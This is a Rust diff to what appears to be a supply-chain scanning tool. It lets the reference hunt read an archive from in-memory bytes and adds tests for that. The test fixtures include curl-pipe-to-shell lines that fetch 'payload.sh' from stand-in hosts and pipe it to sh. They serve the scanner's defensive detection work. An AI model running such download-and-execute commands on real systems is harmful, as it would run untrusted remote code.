@@ -1770,6 +1770,26 @@ pub fn orchestrate(
     capture_deps: bool,
     zip_passwords: &[String],
 ) -> FetchOutcome {
+    orchestrate_with_input(
+        report,
+        root_path,
+        None,
+        policy,
+        progress,
+        capture_deps,
+        zip_passwords,
+    )
+}
+
+pub(crate) fn orchestrate_with_input(
+    report: &mut AnalysisReport,
+    root_path: &Path,
+    root_bytes: Option<&[u8]>,
+    policy: FetchPolicy,
+    progress: bool,
+    capture_deps: bool,
+    zip_passwords: &[String],
+) -> FetchOutcome {
     if !policy.enabled() {
         return FetchOutcome::default();
     }
@@ -1784,7 +1804,7 @@ pub fn orchestrate(
     } else {
         CiRefs::Skip
     };
-    let worklist = collect_references(report, root_path, ci);
+    let worklist = collect_references_from_input(report, root_path, root_bytes, ci);
     let mut session = FetchSession::new(
         report,
         &worklist,
@@ -4865,9 +4885,19 @@ enum CiRefs {
 }
 
 /// References to fetch, grouped by the sha256 of the file that declared them.
+#[cfg(test)]
 fn collect_references(
     report: &AnalysisReport,
     root_path: &Path,
+    ci: CiRefs,
+) -> Vec<(String, Vec<Reference>)> {
+    collect_references_from_input(report, root_path, None, ci)
+}
+
+fn collect_references_from_input(
+    report: &AnalysisReport,
+    root_path: &Path,
+    root_bytes: Option<&[u8]>,
     ci: CiRefs,
 ) -> Vec<(String, Vec<Reference>)> {
     // Members under a vendored node_modules tree have already been analyzed.
@@ -5006,11 +5036,18 @@ fn collect_references(
     if let Some(root) = report.files.first()
         && (ci == CiRefs::Include || !is_ci_context(root))
         && root.size <= ROOT_HUNT_MAX_BYTES
-        && let Ok(bytes) = std::fs::read(root_path)
+        && let Some(bytes) = root_bytes
+            .map(std::borrow::Cow::Borrowed)
+            .or_else(|| std::fs::read(root_path).ok().map(std::borrow::Cow::Owned))
     {
-        let name = root_path
+        let name_path = if root_bytes.is_some() {
+            Path::new(&root.path)
+        } else {
+            root_path
+        };
+        let name = name_path
             .file_name()
-            .map_or_else(|| root_path.to_string_lossy(), |n| n.to_string_lossy());
+            .map_or_else(|| name_path.to_string_lossy(), |n| n.to_string_lossy());
         // A provenance document names one artifact and catalogues many. The
         // string hunt cannot tell those apart, so it is replaced by the subject
         // this document is *about* — see `provenance_subject`.
@@ -5036,7 +5073,7 @@ fn collect_references(
             merge_into_root(&mut groups, &root.sha256, hunted);
         }
     }
-    hunt_download_members(report, root_path, ci, &mut groups);
+    hunt_download_members(report, root_path, root_bytes, ci, &mut groups);
     // Filefacts owns Go's module/workspace semantics. Include raw root hunts
     // in the inputs so they cannot reintroduce an unreconciled declaration.
     let mut group_refs: HashMap<&str, &[Reference]> = HashMap::new();
@@ -5140,6 +5177,7 @@ fn download_intent(findings: &[Finding]) -> Option<&str> {
 fn hunt_download_members(
     report: &AnalysisReport,
     root_path: &Path,
+    root_bytes: Option<&[u8]>,
     ci: CiRefs,
     groups: &mut Vec<(String, Vec<Reference>)>,
 ) {
@@ -5148,6 +5186,9 @@ fn hunt_download_members(
     };
     let prefix = format!("{}!!", root.path);
     let mut hunted_members = 0usize;
+    // Cleave extracts from a path; materialize in-memory input only if a member
+    // actually needs a text hunt, and reuse the temporary file for all members.
+    let mut staged = None;
     for file in members {
         if ci == CiRefs::Skip && is_ci_context(file) {
             continue;
@@ -5186,7 +5227,34 @@ fn hunt_download_members(
             break;
         }
         hunted_members += 1;
-        let bytes = match cleave::extract_member(root_path, member) {
+        let archive_path = if let Some(data) = root_bytes {
+            if staged.is_none() {
+                let stage = (|| -> std::io::Result<tempfile::NamedTempFile> {
+                    use std::io::Write;
+                    let mut file = tempfile::NamedTempFile::new()?;
+                    file.write_all(data)?;
+                    Ok(file)
+                })();
+                match stage {
+                    Ok(file) => staged = Some(file),
+                    Err(e) => {
+                        tracing::warn!(
+                            member,
+                            trigger,
+                            "staging archive for member hunt failed: {e}"
+                        );
+                        break;
+                    }
+                }
+            }
+            let Some(file) = staged.as_ref() else {
+                break;
+            };
+            file.path()
+        } else {
+            root_path
+        };
+        let bytes = match cleave::extract_member(archive_path, member) {
             Ok(Some(bytes)) if bytes.len() as u64 <= MEMBER_HUNT_MAX_BYTES => bytes,
             Ok(Some(bytes)) => {
                 tracing::warn!(
@@ -7898,6 +7966,26 @@ mod tests {
         }))
         .expect("report deserializes");
 
+        // Both paths must use the supplied artifact, even when the label or
+        // fallback path points at a different archive with the same member.
+        let other_dir = tempfile::tempdir().expect("other tempdir");
+        let other = write_tar_zst(other_dir.path(), &[("pkg/src/lib.rs", README)]);
+        let original = std::fs::read(&root).expect("read archive");
+        let memory_groups =
+            collect_references_from_input(&report, &other, Some(&original), CiRefs::Skip);
+        assert!(
+            memory_groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r) == "https://stage.test/bashlinux.sh")
+        );
+        assert!(
+            !memory_groups
+                .iter()
+                .flat_map(|(_, refs)| refs)
+                .any(|r| locator(r) == "https://docs.test/install.sh")
+        );
+
         let groups = collect_references(&report, &root, CiRefs::Skip);
         let hunted: Vec<(&str, String, &str)> = groups
             .iter()
@@ -7917,6 +8005,34 @@ mod tests {
         assert!(
             !source.contains(trigger),
             "the recognizer's own source is kept, never rewritten: {source}"
+        );
+    }
+
+    #[test]
+    fn in_memory_root_text_uses_supplied_bytes_not_path() {
+        let tmp = tempfile::tempdir().expect("tempdir");
+        let other = tmp.path().join("other.sh");
+        std::fs::write(&other, b"curl https://wrong.test/payload.sh | sh\n").unwrap();
+        let data = b"curl https://right.test/payload.sh | sh\n";
+        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
+            "version": "3",
+            "files": [{"id": 0, "path": "script.sh", "depth": 0, "file_type": "shell",
+                "sha256": "aa".repeat(32), "size": data.len()}]
+        }))
+        .unwrap();
+        let groups = collect_references_from_input(&report, &other, Some(data), CiRefs::Skip);
+        let refs: Vec<_> = groups
+            .iter()
+            .flat_map(|(_, refs)| refs)
+            .map(locator)
+            .collect();
+        assert!(
+            refs.iter().any(|url| url.contains("right.test")),
+            "{refs:?}"
+        );
+        assert!(
+            !refs.iter().any(|url| url.contains("wrong.test")),
+            "{refs:?}"
         );
     }
 
